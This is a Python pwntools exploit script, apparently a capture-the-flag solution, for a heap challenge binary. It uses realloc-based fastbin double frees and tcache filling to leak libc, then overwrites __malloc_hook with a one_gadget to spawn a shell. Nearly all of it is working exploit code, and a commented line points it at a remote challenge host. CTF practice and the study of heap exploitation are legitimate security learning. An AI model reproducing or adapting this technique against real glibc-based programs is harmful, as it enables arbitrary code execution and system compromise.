#!/usr/bin/env python 
# coding: utf-8
''' 先填满0x20的tcache，然后利用realloc的free不会清空chunk的指针，完成在fastbin上的double free，
打fastbin attack把后门的堆改成不为空，然后直接666进入后门来泄露libc，接着用同样的方法填满0x71的tcache
然后打fastbin到malloc_hook-0x23的地方，覆盖malloc_hook为one_gadget，进而getshell
'''
from pwn import *

context.log_level = 'info'
context.terminal = ['tmux','splitw','-v']

p = process('./pwn')
#p=remote('119.3.89.93','8011')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')
def add(idx,size,con):
    p.sendlineafter('choice:',str(1))
    p.sendlineafter('index: ',str(idx))
    p.sendlineafter('size: ',str(size))
    p.sendafter('content: ',con)
def change(idx,size,con):
    p.sendlineafter('choice:',str(2))
    p.sendlineafter('index: ',str(idx))
    p.sendlineafter('size: ',str(size))
    p.sendafter('content: ',con)
def change2(idx,size,con):
    p.sendlineafter('choice:',str(2))
    p.sendlineafter('index: ',str(idx))
    p.sendlineafter('size: ',str(size))
def dele(idx):
    p.sendlineafter('choice:',str(3))
    p.sendlineafter('index: ',str(idx))
def show(idx):
    p.sendlineafter('choice:',str(4))
    p.sendlineafter('index: ',str(idx))
    p.recvuntil('content: ')
def call7(idx):
    p.sendlineafter('choice:',str(5))

for i in range (10):
	add(i,0x18,'a'*0x8)
for i in range (10):
	add(i+10,0x30,'a'*0x8)
for i in range (10):
	add(i+20,0x5f,'a'*0x8)
for i in range(7):
	dele(i+1)
# use realloc to double free
change2(0,0,'')
change2(9,0,'')
change2(0,0,'')
#realloc 0x50 where?
show(0)
heap_addr=u64(p.recv(6).ljust(8,'\x00'))-0x390
victim=heap_addr+0x250
log.success('heap addr: '+hex(heap_addr))
add(1,0x18,p64(victim))
add(2,0x18,p64(victim))
add(1,0x18,p64(victim))
add(2,0x18,p64(victim))
sleep(1)
p.sendline('666')
p.recvuntil('there is a gift: ')
printf_addr=int(p.recv(14),16)-0x201910
log.success('printf addr: '+hex(printf_addr))
libc_addr=printf_addr-libc.sym['printf']
log.success('libc base: '+hex(libc_addr))
malloc_hook=libc_addr+libc.sym['__malloc_hook']
#one=[0xe237f,0xe2383,0xe2386,0x106ef8]
one = [0x4f3d5,0x4f432,0x10a41c]
one_gad=one[2]+libc_addr
p.sendline('aaaa')
for i in range(7):
	dele(i+21)
change2(20,0,'')
change2(29,0,'')
change2(20,0,'')
victim2=malloc_hook-0x23
add(4,0x5f,p64(victim2))
add(5,0x5f,p64(victim2))
add(6,0x5f,p64(victim2))
add(7,0x5f,'a'*0x13+p64(one_gad))
sleep(1)
p.sendline('666')
p.recvuntil('there is a gift: ')
p.sendline('aa')
p.interactive()
'''
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL
0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
